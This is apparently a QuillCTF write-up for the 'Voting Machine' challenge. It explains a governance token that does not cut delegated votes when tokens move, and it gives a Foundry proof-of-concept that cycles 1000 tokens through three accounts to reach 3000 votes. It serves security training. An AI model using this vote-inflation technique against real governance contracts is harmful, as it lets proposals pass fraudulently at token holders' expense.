# QuillCTF : Voting Machine

## Object of CTF
vToken is a governance token that allows holders to vote on proposals for the community. As a hacker, you have proposed a malicious proposal and now you need 3000 votes to get it accepted in your favor. Hacker has access to private keys of three other users i.e, Alice, Bob and Carl. Alice has 1000 vTokens but Bob and Carl has none.
Goal here is to get 3000 votes for hacker and also a balance of 1000 vTokens.

## Vulnerability Of VotingMachine Smart Contract
Vulnerability lies in the fact that the vToken Smart Contract does not update deligates voting rights upon the transfer of vTokens. So if let's say Alice has 1000 vTokens and she deligates the hacker. The hacker in this case will have a 1000 voting rights. Now if Alice's tokens are transfered to let's say Bob, ideally deligates voting rights should be reduced by the same amount transfered to Bob but that is not happening. So, if now Bob delegates Hacker, hacker will then have voting rights increased by the amount of vTokens Bob has. And hence these voting rights are created from thin air without extra vTokens.

## Proof Of Concept
### Foundry Test


    // SPDX-License-Identifier: UNLICENSED
    pragma solidity ^0.8.12;
    
    import "forge-std/Test.sol";
    import "../src/VotingMachine.sol";
    
    contract exploitTest is Test {
    	VoteToken vToken;
    	address public owner = address(0);
    	address public hacker =address(1337);
    
    	address public alice= address(1);
    	address public bob = address(2);
    	address public carl = address(3);
    
    	function setUp() public {
    		vm.startPrank(owner);
    		vToken = new VoteToken();
    		vToken.mint(alice, 1000);
    		vm.stopPrank();
      }
    	
    	function testExploit() public {
        vm.startPrank(alice);
            
            // soluiton
    	// First hacker will use Alice account and give himself 
    	// the deligation (or voting power)
    	vToken.delegate(hacker);
    
    	// the hacker will transfer all 1000 token to Bob
    	vToken.transfer(bob, 1000);
    	vm.stopPrank();
    
    	// now hacker will use Bob's account as he has the private key of
    	// Bob too
    	vm.startPrank(bob);
    
    	// hacker will repeat the same process and send tokens to Carl this time
    	vToken.delegate(hacker);
    	vToken.transfer(carl, 1000);
    	vm.stopPrank();
    	
    	// finally hacker will repeat the same process with Carl and send
    	// all 1000 tokens to his own address
    	vm.startPrank(carl);
    
    	vToken.delegate(hacker);
    	vToken.transfer(hacker, 1000); 
    	
    
        vm.stopPrank();
    
    		uint hacker_vote = vToken.getVotes(hacker);
        console.log("Vote Count of Hacker before attack: %s ", hacker_vote);
    
    		uint hacker_balance= vToken.balanceOf(hacker);
        console.log("Hacker's vToken after the attack: %s: ", hacker_balance);
    
    		assertEq(hacker_vote , 3000);
    		assertEq(hacker_balance, 1000);
    	}
    }

	

### Foundry test output
	$ forge test --match-path test/AttackVotingMachine.t.sol -vvv
    [⠒] Compiling...
    No files changed, compilation skipped
    
    Running 1 test for test/AttackVotingMachine.t.sol:exploitTest
    [PASS] testExploit() (gas: 203293)
    Logs:
      Vote Count of Hacker before attack: 3000
      Hacker's vToken after the attack: 1000:
    
    Test result: ok. 1 passed; 0 failed; finished in 4.10ms
